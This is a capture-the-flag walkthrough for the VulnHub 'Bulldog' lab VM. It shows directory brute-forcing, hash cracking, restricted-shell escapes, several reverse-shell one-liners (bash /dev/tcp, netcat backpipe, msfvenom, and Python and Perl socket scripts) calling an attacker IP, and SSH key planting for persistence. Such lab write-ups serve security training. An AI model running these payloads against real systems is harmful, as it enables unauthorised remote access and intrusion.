<h2>Anjing Walkthrough</h2>

![alt text](https://metrouk2.files.wordpress.com/2017/05/175928800.jpg?w=420&h=212&crop=1 "Bulldog")

<p>Url : https://www.vulnhub.com/entry/bulldog-1,211/ </p>

<h4>POC</h4>

<ol>
<li><h4>Start yout VM</h4></li>
 
<li><h4>Information Gathering</h4></li>
<pre>
> Nmap : nmap -sSV 10.0.2.4
> ReconDog
</pre> 

<li><h4>Brouteforce directory : </h4></li>
 <pre>
> Dirb : dirb htpp://bulldog/ /usr/share/wordlists/dirb/common.txt
> Dirsearch.py : ./dirsearch.py -u http://bulldog/ -e txt
> etc..
</br>
<strong>Result</strong> 
[16:27:33] 301 -    0B  - /admin  ->  http://bulldog/admin/
[16:27:33] 302 -    0B  - /admin/  ->  http://bulldog/admin/login/?next=/admin/
[16:27:33] 302 -    0B  - /admin/?/login  ->  http://bulldog/admin/login/?next=/admin/%3F/login
[16:27:33] 301 -    0B  - /admin/login  ->  http://bulldog/admin/login/
[16:27:37] 301 -    0B  - /dev  ->  http://bulldog/dev/
[16:27:37] 200 -    3KB - /dev/
[16:27:42] 200 -    1KB - /robots.txt
</pre>
<li><h4>Brouteforce Password : </h4></li>
<pre>
<strong>Identifier Password hash :</strong> 
> hash-identifier
> hashid : hashid ddf45997a7e18a25ad5f5cf222da64814dd060d5
</br>
<strong>Online Cracked :</strong> 
> https://hashkiller.co.uk/
> https://crackstation.net/
</br>
<strong>Offline Using Worldlist Cracked :</strong> 
> Hashcat : hashcat -m 100 pass /usr/share/wordlists/rockyou.txt -n1 -u1 --force --show
> John the Ripper : john pass --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt
> Hash Buster https://github.com/UltimateHackers/Hash-Buster
</pre>

<li><h4>Login to http://bulldog/admin/ </h4></li>

<li><h4>Go to http://bulldog/dev/shell/ </h4></li>
<pre>
<strong>Command Allowed :</strong>
> ifconfig
> ls
> echo
> pwd
> cat
> rm
</pre>
<p> You can execute command with </p>
<pre>
<strong>Command Escaping Restricted Shell :</strong>
> &
> &&
> |
> "" | bash
</br>
<strong>You can visit link :</strong>
> http://linuxshellaccount.blogspot.co.id/2008/05/restricted-accounts-and-vim-tricks-in.html
> https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells
> http://www.softpanorama.org/Scripting/Shellorama/restricted_shell.shtml
> http://airnesstheman.blogspot.co.id/2011/05/breaking-out-of-jail-restricted-shell.html
</pre>

<li><h4>Reverse Shell </h4></li>
<pre>
<strong>Victim :</strong>
<strong>Bash</strong>
> echo "bash -i >& /dev/tcp/192.168.56.1/1337 0>&1" | bash
> /bin/bash -i > /dev/tcp/192.168.56.1/1337 0<&1 2>&1
</br>
<strong>Gaping Security Hole</strong>
> mknod backpipe p && nc 192.168.56.1 1337 0<backpipe | /bin/bash 1>backpipe
> mknod backpipe p && telnet 192.168.56.1 1337 0<backpipe | /bin/bash 1>backpipe
</br>
<strong>Using msfvenom Script (+x)</strong>
> msfvenom --platform linux -p linux/x86/shell_reverse_tcp LPORT=666 LHOST=192.168.56.1 -f elf -o msfvenomshell
> And tool https://github.com/g0tmi1k/mpc
</br>
<strong>Using Python Script</strong>
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.1",1337))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
------------------------------------
> ls | python file.py
</br>
<strong>Using Perl Script</strong>
use Socket;$i="192.168.56.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
</br>
<strong>Using Php Script</strong>
http://pentestmonkey.net/tools/web-shells/php-reverse-shell
</br>
<strong>Attacker</strong>
> nc -lvp 1337
</br>
<strong>You can visit link :</strong>
> http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
> https://highon.coffee/blog/reverse-shell-cheat-sheet/
> https://github.com/xapax/security/blob/master/reverse-shell.md
</br>
django@bulldog:/home/django/bulldog$ id
uid=1001(django) gid=1001(django) groups=1001(django),27(sudo)
</br>
I have try all method, but command execution no interactive shell, and i can try to change this method..
</br>
<strong>Get interactive shell</strong>
<strong>SSH Method</strong>
> ssh-keygen -t rsa (create keygen on local machine)
> find -iname authorized_keys (check file on victim machine)
> if no exist, can you create on victim machine :
> mkdir .ssh
> touch .ssh/authorized_keys
> ssh-copy-id django@192.168.56.3 (option 1 copy your key to victim machine) 
> echo "your key" > authorized_keys (option 2 copy your key to victim machine)
> ssh django@192.168.56.3 -p 23
> you have execute interactive shell
</pre>
<li><h4>Privilege Escalation </h4></li>
<pre>
<strong>I can try this method</strong>
> https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
> https://www.rebootuser.com/?p=1623
> https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
> https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html
> http://pentestmonkey.net/tools/audit/unix-privesc-check
> https://github.com/rebootuser/LinEnum
> https://github.com/AusJock/Privilege-Escalation
</br>
<strong>And remember check all process running</strong>
> https://www.cyberciti.biz/faq/show-all-running-processes-in-linux/
> service --status-all
</pre>
</br>
